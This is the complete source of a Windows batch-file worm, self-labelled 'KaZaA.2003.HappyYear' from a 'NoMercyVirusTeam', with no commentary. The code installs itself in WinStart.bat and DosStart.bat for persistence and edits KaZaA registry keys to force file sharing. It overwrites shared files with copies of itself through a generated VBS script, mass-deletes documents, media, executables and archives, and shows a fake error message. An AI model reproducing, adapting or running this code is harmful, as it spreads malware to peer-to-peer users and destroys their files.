@Echo Off
:: KaZaA.2003.HappyYear
:: Resy KaZaA File Shareing Worm
:: NoMercyVirusTeam
Echo y| Copy %0 bstart.bat >nul
move bstart.bat %WinBootDir%\2003.bat >nul
c:
cd %WinBootDir%
Echo %WinBootDir%\bstart.bat >tmp.bat
Echo %WinBootDir%\2003.vbs >>tmp.bat
Copy tmp.bat + %WinBootDir%\Winstart.bat %WinBootDir%\system\tmp.bat >nul
Del %WinBootDir%\WinStart.bat >nul
move %WinBootDir%\system\tmp.bat %WinBootDir%\WinStart.bat >nul
Del %WinBootDir%\system\tmp.bat >nul
Copy tmp.bat + %WinBootDir%\DosStart.bat %WinBootDir%\system\tmp.bat >nul
Del %WinBootDir%\DosStart.bat >nul
move %WinBootDir%\system\tmp.bat %WinBootDir%\DosStart.bat >nul
Echo REGEDIT4>KaZaA.reg
Echo [HKEY_CURRENT_USER\Software\Kazaa\LocalContent] >>KaZaA.reg
Echo "DisableSharing"=dword:00000000 >>KaZaA.reg
Echo "DownloadDir"="C:\\Program Files\\KaZaA\\My Shared Folder" >>KaZaA.reg
Mkdir C:\TMP >nul
Echo y| Copy C:\Progra~1\Kazaal~1\Myshar~1\*.* C:\TMP >nul
Echo y| Copy C:\PROGRA~1\KaZaA\MYSHAR~1\*.* C:\TMP >nul
Rename C:\TMP\*.* *.bat >nul
Echo y| Copy %WinBootDir%\bstart.bat C:\ >nul
cd C:\TMP
Echo. On Error Resume Next >2003.vbs
Echo Set FSO = CreateObject("Scripting.FileSystemObject") >>2003.vbs
Echo Set WshShell = CreateObject("WScript.Shell") >>2003.vbs
Echo For Each V in FSO.GetFolder("C:\TMP\").Files >>2003.vbs
Echo If FSO.GetExtensionName(V.Name) = "bat" then >>2003.vbs
Echo FSO.CopyFile ("C:\bstart.bat"), V.Name, 1 >>2003.vbs
Echo End If >>2003.vbs
Echo Next >>2003.vbs
Echo "Dir0"="012345:C:\\TMP">>KaZaA.reg
Echo "Dir1"="012345:C:\\Progra~1\\Kazaal~1\\Myshar~1">>KaZaA.reg
Regedit /s KaZaA.reg >nul
Del KaZaA.reg >nul
Del *.jpg >nul
Del *.bmp >nul
Del *.gif >nul
Del *.txt >nul
Del *.mp3 >nul
Del *.avi >nul
Del *.mpg >nul
Del *.exe >nul
Del *.dat >nul
Del *.pdf >nul
Del *.doc >nul
Del *.ogg >nul
Del *.dll >nul
Del *.xls >nul
Del *.lnk >nul
Del *.mod >nul
Del *.rtf >nul
Del *.ocx >nul
Del *.zip >nul
Del *.mov >nul
Del *.mid >nul
Del *.ico >nul
Del %WinBootDir%\tmp.bat >nul
Echo Fault at XBXeXtXtXaX not a valid Win32 application.
Echo Welcome to KaZaA.2003.HappyYear
@Echo Off
CLS
